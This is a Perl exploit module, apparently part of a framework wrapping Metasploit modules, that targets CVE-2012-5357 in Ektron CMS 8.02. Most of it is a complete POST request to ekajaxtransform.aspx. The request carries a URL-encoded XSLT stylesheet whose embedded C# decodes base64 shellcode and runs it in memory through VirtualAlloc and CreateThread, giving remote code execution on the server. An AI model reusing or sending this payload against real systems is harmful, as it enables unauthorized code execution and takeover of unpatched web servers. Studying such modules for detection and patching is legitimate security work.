package EKTRON::MSF::EktronXsltExec;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "EktronXsltExec";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE => "CVE-2012-5357",
  DESCRIPTION => "

          This module exploits a vulnerability in Ektron CMS 8.02 (before SP5). The

        vulnerability exists due to the insecure usage of XslCompiledTransform, using a

        XSLT controlled by the user. The module has been tested successfully on Ektron CMS

        8.02 over Windows 2003 SP2, which allows to execute arbitrary code with NETWORK

        SERVICE privileges.

      ",
  MSF_MODULE => "ektron_xslt_exec",
  OSVDB => 88107,
  PATHS => ["cms400min/"],
  REFERENCES => [
    "http://webstersprodigy.net/2012/10/25/cve-2012-5357cve-1012-5358-cool-ektron-xslt-rce-bugs/",
    "http://technet.microsoft.com/en-us/security/msvr/msvr12-016",
  ],
  TITLE => "Ektron 8.02 XSLT Transform Remote Code Execution",
  VARIABLES => {
    'PATH' =>       {
  DESCRIPTION => "The URI path of the Ektron CMS",
  VALUE => "/cms400min/",
},
  },

  TYPE => 'MSF',
  PLATFORM => 'WINDOWS',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'WorkArea/ContentDesigner/ekajaxtransform.aspx',
      PAYLOAD      => 'xml=kOtFoqU&xslt=%3c%3fxml%20version%3d%271.0%27%3f%3e%0a%3cxsl%3astylesheet%20version%3d%221.0%22%0axmlns%3axsl%3d%22http%3a//www.w3.org/1999/XSL/Transform%22%0axmlns%3amsxsl%3d%22urn%3aschemas-microsoft-com%3axslt%22%0axmlns%3auser%3d%22http%3a//mycompany.com/mynamespace%22%3e%0a%3cmsxsl%3ascript%20language%3d%22C%23%22%20implements-prefix%3d%22user%22%3e%0a%3c%21%5bCDATA%5b%0a%0aprivate%20static%20UInt32%20MEM_COMMIT%20%3d%200x1000%3b%0aprivate%20static%20UInt32%20PAGE_EXECUTE_READWRITE%20%3d%200x40%3b%0a%0a%5bSystem.Runtime.InteropServices.DllImport%28%22kernel32%22%29%5d%0aprivate%20static%20extern%20UInt32%20VirtualAlloc%28UInt32%20lpStartAddr%2c%20UInt32%20size%2c%20UInt32%20flAllocationType%2c%20UInt32%20flProtect%29%3b%0a%0a%5bSystem.Runtime.InteropServices.DllImport%28%22kernel32%22%29%5d%0aprivate%20static%20extern%20IntPtr%20CreateThread%28UInt32%20lpThreadAttributes%2c%20UInt32%20dwStackSize%2c%20UInt32%20lpStartAddress%2c%20IntPtr%20param%2c%20UInt32%20dwCreationFlags%2c%20ref%20UInt32%20lpThreadId%29%3b%0a%0apublic%20string%20xml%28%29%0a%7b%0a%20%20string%20shellcode64%20%3d%20%40%22L5tHSEdKmUlGmUtKT0dC/D%2bb1pJG%2bED4mC%2bRSy%2bf/UonP/2RP5JBQ5lL9UM/mUf9QkKQk0L5J0GbSUebN59DSDdK/ElDSvlJn0n9Rpn8kUFCSyeX%2bZZGJ5BBRp%2bQ/D%2bZQ0ubkvU3lpFDSPVBkzcnSpM3QT/WkUtJk5DWP0j5TkqRkfj5%2bZEnmU9DTksnkfmTT5AnQ5L8k5iWQ0P9kUs3k0cvSkFJ/D/41j9D9S%2bbL5H8Ri9AkkGRk/xJN5HWSPWXQ/ibl0NIP59Ok0r1Sp%2bQL0lIm9Y/QZMnkpb1N5FGJ0759ZND/UqbP5I/n/hIJ/hC/ZkvkJY3T/lAnydIn5NHSPU/m0eQkfibQydJN/lCN/WRT0H5k/VJ%2bEb1Q0GbkE71SjeY1ks/SUpPL5k3kjeQ%2bUafmSf9N5BKmD%2bTQpOQ9UZOP083Nzc/my83L5mYS0KRQtaX/UCbQflLkpKZS5eRm0JH/Jj8%2bU4/Q/iW/ZKbSEf8R5jWP/hG%2bUKXRpGT/UFLTz%2bZmUY3S5dJP9afLz9PmEY/m0FJS0%2bTLyf5RieXP/lAl0aXm5j1SieXRvgvL5KWL/2YkZ%2bTl/yfT09B9f03SJcn/JuZkEj8n0ufQEFGT0iY%2bDc3n0g3SUiWRpD99UNOQEpKR0iX1tb8QUY/SjdJk/2XSDf9Qj9HmUfWSkFGmEuQ%2bUcnQUpO%2bCdPkkv4%2bTdLQJ9CP/2f/ElASZaXmf1PT5n8kJdPlpmfm0M3TkKS/f1G1pdHP0uQP0KZSJOSk05LQvxJQEY/9UNGlkKSkfxOQUYvkpJD9UpBm0L1n/VDRkf4n0c/mZebSJgnkZsnl5A3kPmWQ/XW%2bJMvL0lDN5KTmEmXm0OWSpNHlj8/P0H5Tpj4R5tLmPg3lv2ZJ5dI%2bEuQTkDWP/VAkUFJlvlPTkBGQUr1%2bJOYl5%2bf1kJB/JhKkkv4nyc3J/VC9ZZD9UibSUk3kkuWkEhHQJ%2bSN9afl/mWmEM/mz%2bbSktKl0ZKSkOW%2bUqfl0FPSZ9DTpmWR0A3%2bUaY/fVGkPxOTktITz%2bY1kiW%2bZtHL0qYm0PW1taX1pInQJNJ/flGkf1AmJNLL0mTSyeQLz%2bZSPz4S5EnL/k3QkNIT5hDmEtIkfVALz%2bSQy8/m04/mUf9k5FHR0mbJ0I3T078SvmSQf2YSpdJmZb1k/j8L5hD/ECWSdbWR/xAQDeQn5ZDQ5b8P/yRkD/5%2bUZAn/lCR/xLQ5I3SkOQN0c3n5v4mJuZ/Dcnl0ZKl0hBkyf9R06Z1k/49S/8SNYnRvn5Jy8nQ5iXn5j1m0ZCQJFDl0CR/UJL/EKWR/35R0v9SE6fl/k3SE78J/kvQD9Gl5ND/PVBR0%2bXP0lAT/VITpZLT0CZ%2bUmbkUcvQZlPP0L5lpj9SPWblkabmE79L0NO%2bJ%2bZlkY/lkAv/PVHJ5ZJQpY/kdY/mZP4N0g/1kGSm5FAkDdPm/hBL9ZL9ZabSDeb1tZCJ0BKL/U3kzdOSZM/SD8vmZmXStZGmfyZSEZDTp%2bT%2bZj8QpeZkpaQ%2bUBJQkGbQkL4T/kvkpdDn/VKkEpPSZhDkEHWT/35QiefQ/1KT/yY%2bUlC%2bElHnydPQvhCkPn1k/z5L5iY1kuXkkrWQJlHTkdPkEP9Si9PL5Yvl5NIN0AnSE%2bZ1taYk/2Qm08/QEY3mfWTQ5iQT0BDl5ZCJ/31n0cvRkL4SpEnkUGTmUrWm0GRS06WR5ZDn/hPQE8nkPxLm/mSl/WXQNYnQkJImEOW/NaYn/xAmf2fm5P4m/yTn5JOP9aWm5ibljc/QkKR/C9Hk5P4S/yb1vgv/JBJQTf1m5n9kD%2bQ%2bEovN/lHkJBBn5A/QEH8P5j8QUhPTkaY%2bEuSR0qYSU71T0KYQTefmydD%2bE6Q/Sf4n0j19UqQk5ZLljdK%2bE%2bb1icnQ/1JRpP41khJQ0n5/ZFAQ5aQQZhOT5ebn0n8S/VPJ5ZOlpKfL0mRm/mTRpj5QtZBQEYnSUIvn0NPN0lIQEOZ%2bfWQ1kBLm5mYSS%2bQP5dGSpNOS/wvQ/WSl/g/SUubkJGQQ9b91puQQkD4mZeZL/VCk/WbQZtPkU6YltYvN/2TS0KfQkon/ZuZSflLQ04/k/mQQZYnnzf1%2bJtKL/38lzc3kPxOR5eRQtbWk5hGk/ifSEGWlzdC%2bZlGkf38%2bZlDmz8/m5hHSkEnkidGTydP1pnWQflIP0JCR/yT1vknS5ubk5BPQ0eTNy%2bb%2bf39N/yZ%2bf1GQEEnkZf4Pz9HJ5InQC9IN/iTQklPTz%2bSkDc//fyTSv1In0iZkE/4k0GZkJ8/SjeYly%2bQTpNLTtZOSJZCQUJDkUZBQPlGJ5Kbn9afkT%2bRkPj5S5I3P5CSSPhON5aZn5b4QpEvL0JHkpJGSUJDQUH9SkJHmf1KQkhLL0H1lphJk5GXP5dB/UmTn/3WP5hIR5snmfmQlpCT1pmRRphIT5vWmUqRlpNGN/z4N5FL/Z%2bQJ5lISPyZQ9aTR/35mD9Glp%2bYR5eQmZBLQkFI%2bJ%2bST0ZDQpmWSEuRQJIvSkFPkJNHTkhC9ZZBR0%2bS9UaYQ5Kb%2bEpAm5P9%2bUlI1kKSkEOYkkub/dZPl0ZKN5%2bRQ/iZJ0lBSvX9mU9DL0pDkfxLkP2ZT0JAP5mWn5aTSpORm0BLkJOXT5AvSJmQP5FBn0pKR/WWmDdGJ5BASNZPQEk3%2bUNKkJeQ/daYkfWT%2bJtPmZgvJ5JON5NPmz/8kEqT%2bE6f%2bEhBgcRU8v//X19QQVlMT0FEX18%3d%22%3b%0a%20%20byte%5b%5d%20shellcode%20%3d%20System.Convert.FromBase64String%28shellcode64%29%3b%0a%20%20UInt32%20funcAddr%20%3d%20VirtualAlloc%280%2c%20%28UInt32%29shellcode.Length%2c%20MEM_COMMIT%2c%20PAGE_EXECUTE_READWRITE%29%3b%0a%20%20System.Runtime.InteropServices.Marshal.Copy%28shellcode%20%2c%200%2c%20%28IntPtr%29%28funcAddr%29%2c%20shellcode%20.Length%29%3b%0a%20%20IntPtr%20hThread%20%3d%20IntPtr.Zero%3b%0a%20%20IntPtr%20pinfo%20%3d%20IntPtr.Zero%3b%0a%20%20UInt32%20threadId%20%3d%200%3b%0a%20%20hThread%20%3d%20CreateThread%280%2c%200%2c%20funcAddr%2c%20pinfo%2c%200%2c%20ref%20threadId%29%3b%0a%20%20return%20%22cZOOq%22%3b%0a%7d%0a%5d%5d%3e%0a%3c/msxsl%3ascript%3e%0a%3cxsl%3atemplate%20match%3d%22/%22%3e%0a%3cxsl%3avalue-of%20select%3d%22user%3axml%28%29%22/%3e%0a%3c/xsl%3atemplate%3e%0a%3c/xsl%3astylesheet%3e%0a',
      TEXT   => 'Sending Exploit #1 Request : [POST] /WorkArea/ContentDesigner/ekajaxtransform.aspx',
      HEADERS      => {
        'Referer' => 'http://127.0.0.1:80/WINDOWS/EKTRON/EktronXsltExec/',
        'Content-Type' => 'application/x-www-form-urlencoded; charset=UTF-8',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
